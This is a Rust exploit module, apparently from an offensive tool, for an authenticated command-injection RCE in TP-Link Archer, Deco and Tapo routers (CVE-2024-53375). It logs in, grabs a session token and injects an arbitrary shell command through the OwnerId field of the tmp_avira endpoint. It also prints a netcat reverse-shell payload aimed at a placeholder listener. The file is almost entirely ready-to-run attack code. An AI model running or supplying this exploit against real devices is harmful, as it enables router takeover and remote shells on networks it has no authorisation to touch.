use anyhow::{Result, Context};
use colored::*;
use reqwest::Client;
use std::time::Duration;
use crate::utils::{prompt_required, normalize_target, prompt_default};

/// TP-Link Archer Series Authenticated RCE (CVE-2024-53375)
/// 
/// Exploits command injection in `/admin/smart_network?form=tmp_avira` endpoint.
/// The `OwnerId` parameter is passed directly to `os.execute` without sanitization.
/// 
/// Affected: TP-Link Archer, Deco, and Tapo series routers
/// Reference: github.com/ThottySploity/CVE-2024-53375

pub async fn run(target: &str) -> Result<()> {
    print_banner();
    
    let raw_ip = if target.is_empty() {
        prompt_required("Target IP/URL")?
    } else {
        target.to_string()
    };
    let target_ip = normalize_target(&raw_ip)?;
    
    let base_url = if target_ip.contains("://") {
        target_ip.clone()
    } else {
        format!("http://{}", target_ip)
    };
    
    println!("{} Target: {}", "[*]".blue(), base_url);
    
    // Authentication required
    let username = prompt_default("Admin username", "admin")?;
    let password = prompt_required("Admin password")?;
    
    let cmd = prompt_default("Command to execute", "id")?;
    
    println!("{} Authenticating...", "[*]".blue());
    
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .cookie_store(true)
        .timeout(Duration::from_secs(15))
        .build()?;
    
    // First, authenticate to get a session
    // TP-Link uses various auth mechanisms; we'll try the common one
    let login_url = format!("{}/cgi-bin/luci/;stok=/login?form=login", base_url.trim_end_matches('/'));
    
    let login_body = serde_json::json!({
        "operation": "login",
        "username": username,
        "password": password
    });
    
    let login_res = client.post(&login_url)
        .json(&login_body)
        .send()
        .await
        .context("Login request failed")?;
    
    // Extract stok from response if available
    let login_text = login_res.text().await?;
    
    // Try to find the stok token
    let stok = if let Some(pos) = login_text.find("\"stok\":\"") {
        let start = pos + 8;
        if let Some(end) = login_text[start..].find('"') {
            Some(login_text[start..start+end].to_string())
        } else {
            None
        }
    } else {
        None
    };
    
    let stok_value = match stok {
        Some(s) => {
            println!("{} Got session token: {}...", "[+]".green(), &s[..s.len().min(8)]);
            s
        },
        None => {
            println!("{} Could not extract session token. Trying without auth...", "[!]".yellow());
            String::new()
        }
    };
    
    // Now send the exploit
    println!("{} Sending exploit payload...", "[*]".blue());
    
    // Command injection via OwnerId parameter
    // The payload uses backticks or semicolons for injection
    let injection = format!(";{};", cmd);
    
    let exploit_url = if stok_value.is_empty() {
        format!("{}/admin/smart_network?form=tmp_avira", base_url.trim_end_matches('/'))
    } else {
        format!("{}/cgi-bin/luci/;stok={}/admin/smart_network?form=tmp_avira", 
                base_url.trim_end_matches('/'), stok_value)
    };
    
    let exploit_body = serde_json::json!({
        "operation": "write",
        "enable": "on",
        "OwnerId": injection
    });
    
    let res = client.post(&exploit_url)
        .json(&exploit_body)
        .send()
        .await
        .context("Exploit request failed")?;
        
    let status = res.status();
    let text = res.text().await.unwrap_or_default();
    
    if status.is_success() {
        println!("{} Exploit sent (HTTP {})!", "[+]".green(), status);
        println!("{} Response: {}", "[*]".blue(), text.chars().take(200).collect::<String>());
        println!("{} Command may have executed. Check for reverse shell or output.", "[*]".yellow());
    } else {
        println!("{} Request returned HTTP {}.", "[-]".red(), status);
        println!("{} Authentication may have failed or endpoint doesn't exist.", "[*]".yellow());
    }
    
    println!();
    println!("{} For reverse shell, use: ;nc -e /bin/sh LHOST LPORT;", "[*]".cyan());

    Ok(())
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║    TP-Link Archer Authenticated RCE (CVE-2024-53375)      ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
